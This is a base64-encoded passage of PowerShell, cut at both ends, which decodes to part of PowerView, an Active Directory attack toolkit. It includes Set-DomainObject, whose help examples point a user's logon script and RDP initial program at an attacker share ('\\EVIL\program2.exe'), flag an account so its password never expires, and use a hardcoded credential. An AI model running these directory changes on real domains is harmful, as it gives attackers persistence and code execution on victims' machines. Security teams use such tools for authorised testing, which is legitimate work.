CAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgICAgPSAgICdtc2RzLXJlcGx2YWx1ZW1ldGFkYXRhJywnZGlzdGluZ3Vpc2hlZG5hbWUnCiAgICAgICAgICAgICdSYXcnICAgICAgICAgICA9ICAgJFRydWUKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgewogICAgICAgICAgICAkUHJvcGVydHlGaWx0ZXIgPSAkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSAtSm9pbiAnfCcKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRQcm9wZXJ0eUZpbHRlciA9ICcnCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0lkZW50aXR5J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJElkZW50aXR5IH0KCiAgICAgICAgR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRPYmplY3RETiA9ICRfLlByb3BlcnRpZXNbJ2Rpc3Rpbmd1aXNoZWRuYW1lJ11bMF0KICAgICAgICAgICAgRm9yRWFjaCgkWE1MTm9kZSBpbiAkXy5Qcm9wZXJ0aWVzWydtc2RzLXJlcGx2YWx1ZW1ldGFkYXRhJ10pIHsKICAgICAgICAgICAgICAgICRUZW1wT2JqZWN0ID0gW3htbF0kWE1MTm9kZSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5ICdEU19SRVBMX1ZBTFVFX01FVEFfREFUQScgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgIGlmICgkVGVtcE9iamVjdCkgewogICAgICAgICAgICAgICAgICAgIGlmICgkVGVtcE9iamVjdC5wc3pBdHRyaWJ1dGVOYW1lIC1NYXRjaCAkUHJvcGVydHlGaWx0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdPYmplY3RETicgJE9iamVjdEROCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnQXR0cmlidXRlTmFtZScgJFRlbXBPYmplY3QucHN6QXR0cmlidXRlTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0F0dHJpYnV0ZVZhbHVlJyAkVGVtcE9iamVjdC5wc3pPYmplY3REbgogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1RpbWVDcmVhdGVkJyAkVGVtcE9iamVjdC5mdGltZUNyZWF0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdUaW1lRGVsZXRlZCcgJFRlbXBPYmplY3QuZnRpbWVEZWxldGVkCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnTGFzdE9yaWdpbmF0aW5nQ2hhbmdlJyAkVGVtcE9iamVjdC5mdGltZUxhc3RPcmlnaW5hdGluZ0NoYW5nZQogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1ZlcnNpb24nICRUZW1wT2JqZWN0LmR3VmVyc2lvbgogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0xhc3RPcmlnaW5hdGluZ0RzYUROJyAkVGVtcE9iamVjdC5wc3pMYXN0T3JpZ2luYXRpbmdEc2FETgogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5BRE9iamVjdExpbmtlZEF0dHJpYnV0ZUhpc3RvcnknKQogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PYmplY3RMaW5rZWRBdHRyaWJ1dGVIaXN0b3J5XSBFcnJvciByZXRyaWV2aW5nICdtc2RzLXJlcGx2YWx1ZW1ldGFkYXRhJyBmb3IgJyRPYmplY3RETiciCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBTZXQtRG9tYWluT2JqZWN0IHsKPCMKLlNZTk9QU0lTCgpNb2RpZmllcyBhIGd2ZW4gcHJvcGVydHkgZm9yIGEgc3BlY2lmaWVkIGFjdGl2ZSBkaXJlY3Rvcnkgb2JqZWN0LgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluT2JqZWN0ICAKCi5ERVNDUklQVElPTgoKU3BsYXRzIHVzZXIvb2JqZWN0IHRhcmdldGluZyBwYXJhbWV0ZXJzIHRvIEdldC1Eb21haW5PYmplY3QsIHJldHVybmluZyB0aGUgcmF3CnNlYXJjaHJlc3VsdCBvYmplY3QuIFJldHJpZXZlcyB0aGUgcmF3IGRpcmVjdG9yeWVudHJ5IGZvciB0aGUgb2JqZWN0LCBhbmQgc2V0cwphbnkgdmFsdWVzIGZyb20gLVNldCBAe30sIFhPUnMgYW55IHZhbHVlcyBmcm9tIC1YT1IgQHt9LCBhbmQgY2xlYXJzIGFueSB2YWx1ZXMKZnJvbSAtQ2xlYXIgQCgpLgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQSBTYW1BY2NvdW50TmFtZSAoZS5nLiBoYXJtajB5KSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049aGFybWoweSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsKSwKU0lEIChlLmcuIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOCksIG9yIEdVSUQgKGUuZy4gNGM0MzVkZDctZGM1OC00YjE0LTlhNWUtMWZkYjBlODBkMjAxKS4KV2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBTZXQKClNwZWNpZmllcyB2YWx1ZXMgZm9yIG9uZSBvciBtb3JlIG9iamVjdCBwcm9wZXJ0aWVzIChpbiB0aGUgZm9ybSBvZiBhIGhhc2h0YWJsZSkgdGhhdCB3aWxsIHJlcGxhY2UgdGhlIGN1cnJlbnQgdmFsdWVzLgoKLlBBUkFNRVRFUiBYT1IKClNwZWNpZmllcyB2YWx1ZXMgZm9yIG9uZSBvciBtb3JlIG9iamVjdCBwcm9wZXJ0aWVzIChpbiB0aGUgZm9ybSBvZiBhIGhhc2h0YWJsZSkgdGhhdCB3aWxsIFhPUiB0aGUgY3VycmVudCB2YWx1ZXMuCgouUEFSQU1FVEVSIENsZWFyCgpTcGVjaWZpZXMgYW4gYXJyYXkgb2Ygb2JqZWN0IHByb3BlcnRpZXMgdGhhdCB3aWxsIGJlIGNsZWFyZWQgaW4gdGhlIGRpcmVjdG9yeS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKClNldC1Eb21haW5PYmplY3QgdGVzdHVzZXIgLVNldCBAeydtc3RzaW5pdGlhbHByb2dyYW0nPSdcXEVWSUxccHJvZ3JhbS5leGUnfSAtVmVyYm9zZQoKVkVSQk9TRTogR2V0LURvbWFpblNlYXJjaGVyIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBHZXQtRG9tYWluT2JqZWN0IGZpbHRlciBzdHJpbmc6ICgmKHwoc2FtQWNjb3VudE5hbWU9dGVzdHVzZXIpKSkKVkVSQk9TRTogU2V0dGluZyBtc3RzaW5pdGlhbHByb2dyYW0gdG8gXFxFVklMXHByb2dyYW0uZXhlIGZvciBvYmplY3QgdGVzdHVzZXIKCi5FWEFNUExFCgoiUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4IiwidGVzdHVzZXIiIHwgU2V0LURvbWFpbk9iamVjdCAtU2V0IEB7J2NvdW50cnljb2RlJz0xMjM0OyAnbXN0c2luaXRpYWxwcm9ncmFtJz0nXFxFVklMXHByb2dyYW0yLmV4ZSd9IC1WZXJib3NlCgpWRVJCT1NFOiBHZXQtRG9tYWluU2VhcmNoZXIgc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzoKKCYofChvYmplY3RzaWQ9Uy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4KSkpClZFUkJPU0U6IFNldHRpbmcgbXN0c2luaXRpYWxwcm9ncmFtIHRvIFxcRVZJTFxwcm9ncmFtMi5leGUgZm9yIG9iamVjdCBoYXJtajB5ClZFUkJPU0U6IFNldHRpbmcgY291bnRyeWNvZGUgdG8gMTIzNCBmb3Igb2JqZWN0IGhhcm1qMHkKVkVSQk9TRTogR2V0LURvbWFpblNlYXJjaGVyIHNlYXJjaCBzdHJpbmc6CkxEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBHZXQtRG9tYWluT2JqZWN0IGZpbHRlciBzdHJpbmc6ICgmKHwoc2FtQWNjb3VudE5hbWU9dGVzdHVzZXIpKSkKVkVSQk9TRTogU2V0dGluZyBtc3RzaW5pdGlhbHByb2dyYW0gdG8gXFxFVklMXHByb2dyYW0yLmV4ZSBmb3Igb2JqZWN0IHRlc3R1c2VyClZFUkJPU0U6IFNldHRpbmcgY291bnRyeWNvZGUgdG8gMTIzNCBmb3Igb2JqZWN0IHRlc3R1c2VyCgouRVhBTVBMRQoKIlMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOCIsInRlc3R1c2VyIiB8IFNldC1Eb21haW5PYmplY3QgLUNsZWFyIGRlcGFydG1lbnQgLVZlcmJvc2UKCkNsZWFyZXMgdGhlICdkZXBhcnRtZW50JyBmaWVsZCBmb3IgYm90aCBvYmplY3QgaWRlbnRpdGllcy4KCi5FWEFNUExFCgpHZXQtRG9tYWluVXNlciB0ZXN0dXNlciB8IENvbnZlcnRGcm9tLVVBQ1ZhbHVlIC1WZXJib3NlCgpOYW1lICAgICAgICAgICAgICAgICAgICAgICAgICAgVmFsdWUKLS0tLSAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tLS0tCk5PUk1BTF9BQ0NPVU5UICAgICAgICAgICAgICAgICA1MTIKCgpTZXQtRG9tYWluT2JqZWN0IC1JZGVudGl0eSB0ZXN0dXNlciAtWE9SIEB7dXNlcmFjY291bnRjb250cm9sPTY1NTM2fSAtVmVyYm9zZQoKVkVSQk9TRTogR2V0LURvbWFpblNlYXJjaGVyIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBHZXQtRG9tYWluT2JqZWN0IGZpbHRlciBzdHJpbmc6ICgmKHwoc2FtQWNjb3VudE5hbWU9dGVzdHVzZXIpKSkKVkVSQk9TRTogWE9SaW5nICd1c2VyYWNjb3VudGNvbnRyb2wnIHdpdGggJzY1NTM2JyBmb3Igb2JqZWN0ICd0ZXN0dXNlcicKCkdldC1Eb21haW5Vc2VyIHRlc3R1c2VyIHwgQ29udmVydEZyb20tVUFDVmFsdWUgLVZlcmJvc2UKCk5hbWUgICAgICAgICAgICAgICAgICAgICAgICAgICBWYWx1ZQotLS0tICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0tLS0KTk9STUFMX0FDQ09VTlQgICAgICAgICAgICAgICAgIDUxMgpET05UX0VYUElSRV9QQVNTV09SRCAgICAgICAgICAgNjU1MzYKCi5FWEFNUExFCgpHZXQtRG9tYWluVXNlciAtSWRlbnRpdHkgdGVzdHVzZXIgLVByb3BlcnRpZXMgc2NyaXB0cGF0aAoKc2NyaXB0cGF0aAotLS0tLS0tLS0tClxccHJpbWFyeVxzeXN2b2xcYmxhaC5wczEKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzISctQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKU2V0LURvbWFpbk9iamVjdCAtSWRlbnRpdHkgdGVzdHVzZXIgLVNldCBAeydzY3JpcHRwYXRoJz0nXFxFVklMXHByb2dyYW0yLmV4ZSd9IC1DcmVkZW50aWFsICRDcmVkIC1WZXJib3NlClZFUkJPU0U6IFtHZXQtRG9tYWluXSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMgZm9yIEdldC1Eb21haW4KVkVSQk9TRTogW0dldC1Eb21haW5dIEV4dHJhY3RlZCBkb21haW4gJ1RFU1RMQUInIGZyb20gLUNyZWRlbnRpYWwKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgTERBUCBjb25uZWN0aW9uClZFUkJPU0U6IFtHZXQtRG9tYWluT2JqZWN0XSBHZXQtRG9tYWluT2JqZWN0IGZpbHRlciBzdHJpbmc6ICgmKHwofChzYW1BY2NvdW50TmFtZT10ZXN0dXNlcikobmFtZT10ZXN0dXNlcikpKSkKVkVSQk9TRTogW1NldC1Eb21haW5PYmplY3RdIFNldHRpbmcgJ3NjcmlwdHBhdGgnIHRvICdcXEVWSUxccHJvZ3JhbTIuZXhlJyBmb3Igb2JqZWN0ICd0ZXN0dXNlcicKCkdldC1Eb21haW5Vc2VyIC1JZGVudGl0eSB0ZXN0dXNlciAtUHJvcGVydGllcyBzY3JpcHRwYXRoCgpzY3JpcHRwYXRoCi0tLS0tLS0tLS0KXFxFVklMXHByb2dyYW0yLmV4ZQojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1JlcGxhY2UnKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRTZXQsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0hhc2h0YWJsZV0KICAgICAgICAkWE9SLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ2xlYXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAeydSYXcnID0gJFRydWV9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snSWRlbnRpdHknXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkSWRlbnRpdHkgfQoKICAgICAgICAjIHNwbGF0IHRoZSBhcHByb3ByaWF0ZSBhcmd1bWVudHMgdG8gR2V0LURvbWFpbk9iamVjdAogICAgICAgICRSYXdPYmplY3QgPSBHZXQtRG9tYWluT2JqZWN0IEBTZWFyY2hlckFyZ3VtZW50cwoKICAgICAgICBGb3JFYWNoICgkT2JqZWN0IGluICRSYXdPYmplY3QpIHsKCiAgICAgICAgICAgICRFbnRyeSA9ICRSYXdPYmplY3QuR2V0RGlyZWN0b3J5RW50cnkoKQoKICAgICAgICAgICAgaWYoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXQnXSkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkUFNCb3VuZFBhcmFtZXRlcnNbJ1NldCddLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5PYmplY3RdIFNldHRpbmcgJyQoJF8uTmFtZSknIHRvICckKCRfLlZhbHVlKScgZm9yIG9iamVjdCAnJCgkUmF3T2JqZWN0